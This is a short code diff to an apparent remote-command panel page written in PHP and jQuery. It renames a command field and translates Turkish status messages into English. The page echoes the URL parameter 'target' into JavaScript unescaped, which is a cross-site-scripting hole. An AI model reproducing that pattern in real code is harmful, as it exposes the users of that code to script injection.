@@ -68,7 +68,7 @@ require_once 'module_controller.php';
                 var commands = {
                     send_command: true,
                     target:"<?php echo $_GET['target'];?>",
-                    type: 'get_list_file',
+                    command: 'get_list_file',
                     value: {
                             "target_file_path": filePath
                         }
@@ -77,13 +77,13 @@ require_once 'module_controller.php';
                 $.post( "commands.php", commands, function( data, err ) {
                     if (data.status){
                         Toastify({
-                            text: "Komut gönderildi.!",
+                            text: "Command Sent!",
                             backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                             className: "info",
                         }).showToast();
                     } else {
                         Toastify({
-                            text: "Komut başarısız.!",
+                            text: "Command Failed.!",
                             backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                             className: "info",
                         }).showToast();
@@ -117,13 +117,13 @@ require_once 'module_controller.php';
                     $.post( "commands.php", commands, function( data, err ) {
                         if (data.status){
                             Toastify({
-                                text: "Komut gönderildi.!",
+                                text: "Command Sent!",
                                 backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                                 className: "info",
                             }).showToast();
                         } else {
                             Toastify({
-                                text: "Komut başarısız.!",
+                                text: "Command Failed.!",
                                 backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                                 className: "info",
                             }).showToast();
@@ -150,7 +150,7 @@ require_once 'module_controller.php';
                 $.post( "commands.php", commands, function( data, err ) {
                     if (data){
                         Toastify({
-                            text: "Komut gönderildi.!",
+                            text: "Command Sent!",
                             backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                             className: "info",
                         }).showToast();
@@ -163,7 +163,7 @@ require_once 'module_controller.php';
 
                     } else {
                         Toastify({
-                            text: "Komut başarısız.!",
+                            text: "Command Failed.!",
                             backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                             className: "info",
                         }).showToast();
